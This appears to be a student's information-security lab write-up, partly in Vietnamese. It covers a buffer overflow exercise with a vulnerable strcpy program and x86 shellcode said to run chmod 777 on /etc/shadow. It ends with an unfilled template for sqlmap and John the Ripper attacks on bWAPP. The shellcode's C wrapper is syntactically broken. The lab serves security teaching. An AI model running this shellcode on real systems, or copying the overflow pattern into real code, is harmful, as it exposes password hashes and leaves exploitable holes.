# 22110021_HanMinhDinh_InforSercu_Lab1
# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege

**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:
- First i will mapped to my file here is my-docker-image
![image](https://github.com/user-attachments/assets/2394dc24-071e-4d8d-baca-5c0b1d7e17a8)
-chúng ta xem thử trong này đang có những file nào
![image](https://github.com/user-attachments/assets/17c7f6c2-696c-4ca4-a4da-7f7f275235c4)
-và chúng ta tạo ra 1 file vulnerable mới, và truy cập vào nó 
![image](https://github.com/user-attachments/assets/8d09e0a4-8777-4c03-a3a0-789147b5cc46)
-sau đó ta bỏ lệnh này vào file
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
![image](https://github.com/user-attachments/assets/cddb1366-b8b4-4404-96ec-b2a30072dada)
- sau đó lưu và thoát ra
- chúng ta làm tương tự với file shellcode.c
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
![image](https://github.com/user-attachments/assets/56a72d4d-6c8f-47a0-acf3-b722830cbdcd)

![image](https://github.com/user-attachments/assets/e9b35c20-0372-4b55-a41c-5847d3225ca9)
- sau đó ta cần biên dịch các file này
![image](https://github.com/user-attachments/assets/22ec116d-d41f-4422-ba07-af6eefe2ceec)
![image](https://github.com/user-attachments/assets/64707d00-0474-4dd6-bedc-6e0e997bae7e)
- sau đó ta vào chạy file shellcode
![image](https://github.com/user-attachments/assets/f51ea33a-c12a-43c1-8c65-a9c3d415d8de)
- và ta chạy
![image](https://github.com/user-attachments/assets/79daa6bd-f1f8-4c74-8843-21764aefeb7e)
![image](https://github.com/user-attachments/assets/e56e5dbb-a5d4-41b8-9eb1-819ef64535f2)
![image](https://github.com/user-attachments/assets/9d29832f-17d3-4415-a5ea-3b3dec9659bc)
![image](https://github.com/user-attachments/assets/bbd339f4-9fca-4328-97fb-8e476842d191)

Description text (optional)


``` 
    code block (optional)
```

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
